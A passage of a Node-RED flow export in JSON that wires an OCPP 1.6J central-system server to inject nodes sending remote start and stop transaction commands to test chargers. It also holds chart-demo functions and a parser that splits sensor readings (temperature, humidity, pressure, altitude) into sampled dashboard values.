        "id": "d05f0bc4a54585d6",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Sent payload",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1090,
        "y": 140,
        "wires": []
    },
    {
        "id": "23cbe1e51e37907a",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Unknown payload",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 810,
        "y": 300,
        "wires": []
    },
    {
        "id": "90496879209cb136",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Test inject 1",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "",
        "payloadType": "date",
        "x": 610,
        "y": 440,
        "wires": [
            [
                "b1f1cafd2aaecd67"
            ]
        ]
    },
    {
        "id": "8701889d1a0798f1",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 990,
        "y": 440,
        "wires": []
    },
    {
        "id": "7067d5fc71ae865d",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Test inject 2",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "Hello Topic!",
        "payload": "Hello Tibi!",
        "payloadType": "str",
        "x": 610,
        "y": 480,
        "wires": [
            [
                "b1f1cafd2aaecd67"
            ]
        ]
    },
    {
        "id": "443758f7090b4b85",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Start NodeMCU",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStartTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 180,
        "y": 760,
        "wires": [
            [
                "b65256b9a5530d8a"
            ]
        ]
    },
    {
        "id": "2b9fd7a8b506eb4f",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request payload",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 580,
        "y": 640,
        "wires": []
    },
    {
        "id": "e1e9b38ebd767703",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Start HTML1",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStartTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 170,
        "y": 580,
        "wires": [
            [
                "fd2409ff6c370642"
            ]
        ]
    },
    {
        "id": "e6d8a4917efb9fe2",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Start HTML2",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStartTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 170,
        "y": 640,
        "wires": [
            [
                "90402ed4d9548049"
            ]
        ]
    },
    {
        "id": "dc2883f2968063e0",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Start HTML3",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStartTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 170,
        "y": 700,
        "wires": [
            [
                "e6be253ae49e19fe"
            ]
        ]
    },
    {
        "id": "6dd67f71d823980b",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request payload",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1240,
        "y": 640,
        "wires": []
    },
    {
        "id": "3d2d9eb7b7956704",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Stop NodeMCU",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStopTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 840,
        "y": 760,
        "wires": [
            [
                "594bf77428e17ba1"
            ]
        ]
    },
    {
        "id": "1841f512c726f2d1",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Stop HTML",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStopTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 830,
        "y": 520,
        "wires": [
            [
                "498a7c173db63974"
            ]
        ]
    },
    {
        "id": "7c50c643e19e8d7b",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Stop HTML1",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStopTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 830,
        "y": 580,
        "wires": [
            [
                "1100b49c639968a4"
            ]
        ]
    },
    {
        "id": "8474c3520cf9cacb",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Stop HTML2",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStopTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 830,
        "y": 640,
        "wires": [
            [
                "cf9881f3f57fe8fd"
            ]
        ]
    },
    {
        "id": "41baef9a4e0955e4",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Stop HTML3",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStopTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 830,
        "y": 700,
        "wires": [
            [
                "683746e6fe876ee8"
            ]
        ]
    },
    {
        "id": "6b57b8ce283def87",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "Start HTML",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"command\":\"RemoteStartTransaction\",\"data\":{\"idTag\":\"1\"}}",
        "payloadType": "json",
        "x": 170,
        "y": 520,
        "wires": [
            [
                "05a659a8606f36b0"
            ]
        ]
    },
    {
        "id": "5419cc087ae01cfe",
        "type": "python-function",
        "z": "acc9f35a.ec54d8",
        "d": true,
        "name": "",
        "func": "\nmsg = '{{payload}}'\nwhile True:\n    print(msg)\n    time.sleep(10)",
        "outputs": 1,
        "x": 800,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "b1f1cafd2aaecd67",
        "type": "pythonshell in",
        "z": "acc9f35a.ec54d8",
        "d": true,
        "name": "Python script",
        "pyfile": "/home/pi/Documents/mainPythonTest.py",
        "virtualenv": "",
        "continuous": false,
        "stdInData": false,
        "x": 810,
        "y": 440,
        "wires": [
            [
                "8701889d1a0798f1"
            ]
        ]
    },
    {
        "id": "2d778df937587cfe",
        "type": "ip",
        "z": "acc9f35a.ec54d8",
        "name": "ip",
        "https": false,
        "timeout": "5000",
        "internalIPv4": true,
        "internalIPv6": true,
        "publicIPv4": true,
        "publicIPv6": false,
        "x": 290,
        "y": 120,
        "wires": [
            [
                "18419d3094e0725d"
            ]
        ]
    },
    {
        "id": "8cee8d67.a2e858",
        "type": "CS server",
        "z": "acc9f35a.ec54d8",
        "name": "CentralSystem@8834",
        "port": "8834",
        "enabled15": false,
        "path15": "/ocpp15s",
        "enabled16": false,
        "path16": "/ocpp16s",
        "enabled16j": true,
        "path16j": "",
        "log": true,
        "pathlog": "/home/pi/Documents/OCPP__.log",
        "x": 180,
        "y": 220,
        "wires": [
            [
                "68a8235f.451e04",
                "7dcf2c29.43a464",
                "05c96047a271c85d",
                "7cb49bdcb9c5a6f1"
            ]
        ]
    },
    {
        "id": "87468474.e9785",
        "type": "server response",
        "z": "acc9f35a.ec54d8",
        "name": "",
        "x": 1100,
        "y": 180,
        "wires": []
    },
    {
        "id": "b65256b9a5530d8a",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "c40fa4abfe9f0cbc",
        "command": "RemoteStartTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 350,
        "y": 760,
        "wires": [
            [
                "2b9fd7a8b506eb4f"
            ]
        ]
    },
    {
        "id": "05a659a8606f36b0",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "2bafdaab.15b956",
        "command": "RemoteStartTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 350,
        "y": 520,
        "wires": [
            [
                "2b9fd7a8b506eb4f"
            ]
        ]
    },
    {
        "id": "fd2409ff6c370642",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "827088a0b0ec5431",
        "command": "RemoteStartTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 350,
        "y": 580,
        "wires": [
            [
                "2b9fd7a8b506eb4f"
            ]
        ]
    },
    {
        "id": "90402ed4d9548049",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "ea648ad3e5daea23",
        "command": "RemoteStartTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 350,
        "y": 640,
        "wires": [
            [
                "2b9fd7a8b506eb4f"
            ]
        ]
    },
    {
        "id": "e6be253ae49e19fe",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "14889abbc7a936c9",
        "command": "RemoteStartTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 350,
        "y": 700,
        "wires": [
            [
                "2b9fd7a8b506eb4f"
            ]
        ]
    },
    {
        "id": "594bf77428e17ba1",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "c40fa4abfe9f0cbc",
        "command": "RemoteStopTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 1010,
        "y": 760,
        "wires": [
            [
                "6dd67f71d823980b"
            ]
        ]
    },
    {
        "id": "1100b49c639968a4",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "827088a0b0ec5431",
        "command": "RemoteStopTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 1010,
        "y": 580,
        "wires": [
            [
                "6dd67f71d823980b"
            ]
        ]
    },
    {
        "id": "cf9881f3f57fe8fd",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "ea648ad3e5daea23",
        "command": "RemoteStopTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 1010,
        "y": 640,
        "wires": [
            [
                "6dd67f71d823980b"
            ]
        ]
    },
    {
        "id": "683746e6fe876ee8",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "14889abbc7a936c9",
        "command": "RemoteStopTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 1010,
        "y": 700,
        "wires": [
            [
                "6dd67f71d823980b"
            ]
        ]
    },
    {
        "id": "498a7c173db63974",
        "type": "CS request JSON",
        "z": "acc9f35a.ec54d8",
        "name": "CS Request",
        "remotecb": "2bafdaab.15b956",
        "command": "RemoteStopTransaction",
        "cmddata": "",
        "log": true,
        "pathlog": "",
        "x": 1010,
        "y": 520,
        "wires": [
            [
                "6dd67f71d823980b"
            ]
        ]
    },
    {
        "id": "f58fbfcc55d02e4d",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m={};\nm.labels = [\"January\", \"February\", \"March\", \"April\", \"May\", \"June\", \"July\"];\nm.series = ['Series A', 'Series B', 'Series C'];\nm.data = [\n    [65, 59, 80, 81, 56, 55, 40],\n    [28, 48, 40, 19, 86, 27, 120],\n    [38, 28, 20, 49, 45, 60, 20]\n  ];\nreturn {payload:[m]};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 380,
        "wires": [
            [
                "937af8e080c7e05a",
                "4b367719412bccf8",
                "76cb5629f98905ed",
                "e0cd556d1577cf81"
            ]
        ]
    },
    {
        "id": "38dec9d76196226e",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var chart = [{\n    \"series\":[\"A\",\"B\",\"C\"],\n    \"data\":[[{\"x\":1504029632890,\"y\":5},{\"x\":1504029636001,\"y\":4},{\"x\":1504029638656,\"y\":2}],[{\"x\":1504029633514,\"y\":6},{\"x\":1504029636622,\"y\":7},{\"x\":1504029639539,\"y\":6}],[{\"x\":1504029634400,\"y\":7},{\"x\":1504029637959,\"y\":9},{\"x\":1504029640317,\"y\":7}]],\n    \"labels\":[\"\"]\n}];\nmsg.payload = chart;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "x": 300,
        "y": 220,
        "wires": [
            [
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "7648858541abc633",
        "type": "inject",
        "z": "bbb8295636ce293b",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "",
        "payloadType": "str",
        "x": 160,
        "y": 580,
        "wires": [
            [
                "e0a37e248b12442c"
            ]
        ]
    },
    {
        "id": "ef056597a00ce1f3",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m={};\nm.labels = [10,20,30,40,50,60,70];\nm.series = ['Series A', 'Series B', 'Series C', 'Series D'];\nm.data = [\n    [65, 59, 80, 81, 56, 55, 40],\n    [28, 48, 40, 19, 86, 27, 90],\n    [38, 28, 20, 49, 45, 60, 20],\n    [58, 18, 40, 29, 15, 30, 60]\n  ];\nreturn {payload:[m]};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 420,
        "wires": [
            [
                "937af8e080c7e05a",
                "4b367719412bccf8",
                "76cb5629f98905ed",
                "e0cd556d1577cf81"
            ]
        ]
    },
    {
        "id": "cc3cb0ccbd7f63ed",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var chart = [{\n    \"series\":[\"A\",\"B\",\"C\"],\n        \"data\":[[{\"x\":1,\"y\":5},{\"x\":2,\"y\":4},{\"x\":3,\"y\":2}],[{\"x\":4,\"y\":6},{\"x\":5,\"y\":7},{\"x\":6,\"y\":6}],[{\"x\":7,\"y\":7},{\"x\":8,\"y\":9},{\"x\":9,\"y\":7}]],\n    \"labels\":[\"\"]\n}];\nmsg.payload = chart;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "x": 300,
        "y": 260,
        "wires": [
            [
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "a082c3b414d777b6",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m = {};\nm.labels = [\"Download\", \"In-Store\", \"Mail-Order\"];\nm.data = [[300, 500, 100]];\nm.series = [\"Sales\"];\nreturn {payload:[m],topic:msg.topic};",
        "outputs": 1,
        "noerr": 0,
        "x": 320,
        "y": 620,
        "wires": [
            [
                "e0cd556d1577cf81",
                "4b367719412bccf8",
                "937af8e080c7e05a",
                "6f36987be8b7a747",
                "d6d0718936c31816",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "3a45cf6d69cd016f",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var chart = [{\n    \"series\":[\"A\",\"B\",\"C\"],\n        \"data\":[[{\"x\":1000000,\"y\":5},{\"x\":2000000,\"y\":4},{\"x\":3000000,\"y\":2}],[{\"x\":4000000,\"y\":6},{\"x\":5000000,\"y\":7},{\"x\":6000000,\"y\":6}],[{\"x\":7000000,\"y\":7},{\"x\":8000000,\"y\":9},{\"x\":9000000,\"y\":7}]],\n    \"labels\":[\"\"]\n}];\nmsg.payload = chart;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "x": 300,
        "y": 300,
        "wires": [
            [
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "11f1992c2917882e",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var chart = [{\n    \"series\":[\"A\",\"B\",\"C\"],\n        \"data\":[[{\"x\":1000000000,\"y\":5},{\"x\":2000000000,\"y\":4},{\"x\":3000000000,\"y\":2}],[{\"x\":4000000000,\"y\":6},{\"x\":5000000000,\"y\":7},{\"x\":6000000000,\"y\":6}],[{\"x\":7000000000,\"y\":7},{\"x\":8000000000,\"y\":9},{\"x\":9000000000,\"y\":7}]],\n    \"labels\":[\"\"]\n}];\nmsg.payload = chart;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 340,
        "wires": [
            [
                "937af8e080c7e05a"
            ]
        ]
    },
    {
        "id": "753ff3c4d82a0f2a",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m={\n    \"series\":[\"X\",\"Y\",\"Z\"],\n    \"data\":[[5,6,9],[3,8,5],[6,7,2]],\n    \"labels\":[\"Jan\",\"Feb\",\"Mar\"]\n};\nreturn {payload:[m]};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 540,
        "wires": [
            [
                "937af8e080c7e05a",
                "4b367719412bccf8",
                "e0cd556d1577cf81",
                "6f36987be8b7a747",
                "d6d0718936c31816",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "60a34168154a3577",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m = {};\nm.labels = ['2006', '2007', '2008', '2009', '2010', '2011', '2012'];\nm.data = [[28, 48, 40, 19, 86, 27, 90]];\nm.series = ['Series A'];\nreturn {payload:[m],topic:msg.topic};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 320,
        "y": 660,
        "wires": [
            [
                "e0cd556d1577cf81",
                "4b367719412bccf8",
                "d6d0718936c31816",
                "6f36987be8b7a747",
                "937af8e080c7e05a",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "94aada2f9a9326b7",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "topic",
        "func": "var m = [\n    {topic:\"X\", payload:22},\n    {topic:\"Y\", payload:66},\n    {topic:\"Z\", payload:42}\n    ];\nreturn [m];",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 180,
        "wires": [
            [
                "4b367719412bccf8",
                "e0cd556d1577cf81",
                "937af8e080c7e05a",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "e0b89f7d2b4d44c1",
        "type": "inject",
        "z": "bbb8295636ce293b",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "",
        "payloadType": "date",
        "x": 160,
        "y": 180,
        "wires": [
            [
                "94aada2f9a9326b7"
            ]
        ]
    },
    {
        "id": "6b1553294b660423",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "label",
        "func": "var m = [\n    {label:\"A\", payload:22},\n    {label:\"B\", payload:66},\n    {label:\"C\", payload:42},\n    ];\nreturn [m];",
        "outputs": 1,
        "noerr": 0,
        "x": 300,
        "y": 140,
        "wires": [
            [
                "4b367719412bccf8",
                "e0cd556d1577cf81",
                "937af8e080c7e05a",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "3881fead75fbfeef",
        "type": "inject",
        "z": "bbb8295636ce293b",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "",
        "payloadType": "date",
        "x": 160,
        "y": 140,
        "wires": [
            [
                "6b1553294b660423"
            ]
        ]
    },
    {
        "id": "1c65b2299ebe75f6",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m={\n    \"series\":[\"X\",\"Y\",\"Z\"],\n    \"data\":[[5],[3],[6]],\n    \"labels\":[\"Jan\"]\n};\nreturn {payload:[m]};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 460,
        "wires": [
            [
                "4b367719412bccf8",
                "6f36987be8b7a747",
                "d6d0718936c31816",
                "937af8e080c7e05a",
                "76cb5629f98905ed",
                "e0cd556d1577cf81"
            ]
        ]
    },
    {
        "id": "f3de8ebe9396e279",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var m={\n    \"series\":[\"X\"],\n    \"data\":[[5,3,6]],\n    \"labels\":[\"Jan\",\"Feb\",\"Mar\"]\n};\nreturn {payload:[m]};",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 500,
        "wires": [
            [
                "4b367719412bccf8",
                "937af8e080c7e05a",
                "d6d0718936c31816",
                "6f36987be8b7a747",
                "76cb5629f98905ed",
                "e0cd556d1577cf81"
            ]
        ]
    },
    {
        "id": "f7a09faecbd3bd67",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "label",
        "func": "var m = [\n    {label:\"A\", payload:22, series:\"X\"},\n    {label:\"B\", payload:66, series:\"X\"},\n    {label:\"C\", payload:42, series:\"X\"},\n    {label:\"A\", payload:33, series:\"Y\"},\n    {label:\"B\", payload:72, series:\"Y\"},\n    {label:\"C\", payload:12, series:\"Y\"},\n    {label:\"A\", payload:44, series:\"Z\"},\n    {label:\"B\", payload:32, series:\"Z\"},\n    {label:\"C\", payload:80, series:\"Z\"}\n    ];\nreturn [m];",
        "outputs": 1,
        "noerr": 0,
        "x": 300,
        "y": 100,
        "wires": [
            [
                "e0cd556d1577cf81",
                "4b367719412bccf8",
                "937af8e080c7e05a",
                "76cb5629f98905ed"
            ]
        ]
    },
    {
        "id": "5194fa2ead80b091",
        "type": "inject",
        "z": "bbb8295636ce293b",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "",
        "payloadType": "date",
        "x": 160,
        "y": 100,
        "wires": [
            [
                "f7a09faecbd3bd67"
            ]
        ]
    },
    {
        "id": "a14ff16d2f828684",
        "type": "debug",
        "z": "bbb8295636ce293b",
        "name": "Frame from Sensors",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 580,
        "y": 740,
        "wires": []
    },
    {
        "id": "8c94c1745a471862",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "",
        "func": "var newMsg = {payload: msg.payload.toString()};\nreturn newMsg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 250,
        "y": 740,
        "wires": [
            [
                "b1e7019a6bd02298"
            ]
        ]
    },
    {
        "id": "b1e7019a6bd02298",
        "type": "split",
        "z": "bbb8295636ce293b",
        "name": "",
        "splt": " ",
        "spltType": "str",
        "arraySplt": "1",
        "arraySpltType": "len",
        "stream": false,
        "addname": "",
        "x": 370,
        "y": 740,
        "wires": [
            [
                "45fd5c923414b899",
                "a14ff16d2f828684"
            ]
        ]
    },
    {
        "id": "45fd5c923414b899",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "Payload Object Sensor",
        "func": "var newMsg = {};\nvar Sensor = {\n    NData: 0, \n    Temp_DHT11: 0,\n    Humid_DHT: 0,\n    Temp_DS: 0,\n    Temp_BMP: 0,\n    Pressure_BMP: 0,\n    Altitud_BMP: 0,\n    Time: new Date().toString()\n};\n\ncontext.data = context.data || {};\n\nswitch(msg.parts.index){\n    case 0:\n        context.data.NData = parseFloat(msg.payload);\n        msg = null;\n        break;\n    case 1:\n        context.data.Temp_DHT11 = parseFloat(msg.payload);\n        msg = null;\n        break;\n    case 2:\n        context.data.Humid_DHT = parseFloat(msg.payload);\n        msg = null;\n        break;\n    case 3:\n        context.data.Temp_DS = parseFloat(msg.payload);\n        msg = null;\n        break;\n    case 4:\n        context.data.Temp_BMP = parseFloat(msg.payload);\n        msg = null;\n        break;   \n    case 5:\n        context.data.Pressure_BMP = parseFloat(msg.payload);\n        msg = null;\n        break;\n    case 6:\n        context.data.Altitud_BMP = parseFloat(msg.payload);\n        msg = null;\n        break;\n    default:\n        msg = null;\n        break;\n}\n\nAllData = context.data.NData &&\n          context.data.Temp_DHT11 &&\n          context.data.Humid_DHT &&\n          context.data.Temp_DS &&\n          context.data.Temp_BMP &&\n          context.data.Pressure_BMP &&\n          context.data.Altitud_BMP;\n\nif(AllData){\n    var time = Date();\n    context.data.Time = time.toString();\n    Sensor = context.data;\n    newMsg = { payload: context.data,\n    topic: 'Frame Sensor' };\n    context.data = null;\n    return newMsg;\n}\nelse\n    return msg;\n\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 220,
        "y": 820,
        "wires": [
            [
                "899b0e86e83485b7",
                "3de060a1fee37089"
            ]
        ]
    },
    {
        "id": "899b0e86e83485b7",
        "type": "function",
        "z": "bbb8295636ce293b",
        "name": "Split Data",
        "func": "var msgTemp_DHT11 = {payload: msg.payload.Temp_DHT11};\nvar msgHumid_DHT = {payload: msg.payload.Humid_DHT};\nvar msgTemp_DS = {payload: msg.payload.Temp_DS};\nvar msgTemp_BMP = {payload: msg.payload.Temp_BMP};\nvar msgPressure_BMP = {payload: (msg.payload.Pressure_BMP/100000).toFixed(2)};\nvar msgAltitud_BMP = {payload: msg.payload.Altitud_BMP};\n\nreturn [msgTemp_DHT11, msgHumid_DHT, msgTemp_DS, msgTemp_BMP, msgPressure_BMP, msgAltitud_BMP ];",
        "outputs": "6",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 1120,
        "wires": [
            [
                "04f534d1b6762b35",
                "c11108d00157b394"
            ],
            [
                "453f68b9649f4f82",
                "92633e94f50fbba3",
                "948829b41f444402"
            ],
            [
                "12131cae4c75d17c",
                "74654eabfc7b2c22",
                "aca8edd5d0be77bd"
            ],
            [
                "f6d6bbd6600baabd",
                "37f5a2f1ca5e5f37"
            ],
            [
                "e593bd2244886661",
                "c0c2e5b43986c6b6"
            ],
            []
        ]
    },
    {
        "id": "92633e94f50fbba3",
        "type": "trigger",
        "z": "bbb8295636ce293b",
        "name": "Sample 5 Min",
        "op1": "",
        "op2": "",
        "op1type": "pay",
        "op2type": "nul",
        "duration": "5",
        "extend": false,
        "units": "min",
        "reset": "",
        "outputs": 1,
        "x": 560,
        "y": 1060,
        "wires": [
            [
                "947abda074f4cf6f"
            ]
        ]
    },
    {
        "id": "c0c2e5b43986c6b6",
        "type": "trigger",
        "z": "bbb8295636ce293b",
        "name": "Sample 5 Min",
        "op1": "",
        "op2": "",
        "op1type": "pay",
        "op2type": "nul",
        "duration": "5",
        "extend": false,
        "units": "min",
        "reset": "",
        "outputs": 1,
        "x": 560,
        "y": 1340,
        "wires": [
            [
                "da084496cf238f30"
            ]
        ]
    },
    {
        "id": "aca8edd5d0be77bd",
        "type": "trigger",
        "z": "bbb8295636ce293b",
        "name": "Sample 5 Min",
        "op1": "",
        "op2": "",
        "op1type": "pay",
        "op2type": "nul",
        "duration": "5",
        "extend": false,
        "units": "min",
        "reset": "",
        "outputs": 1,
        "x": 560,
        "y": 1180,
        "wires": [
            [
                "1330abbf5f76ad7c"
            ]
        ]
    },
    {
        "id": "3de060a1fee37089",
        "type": "debug",
        "z": "bbb8295636ce293b",
        "name": "Frame from Sensors",
        "active": false,
        "console": "false",
        "complete": "true",
        "x": 580,
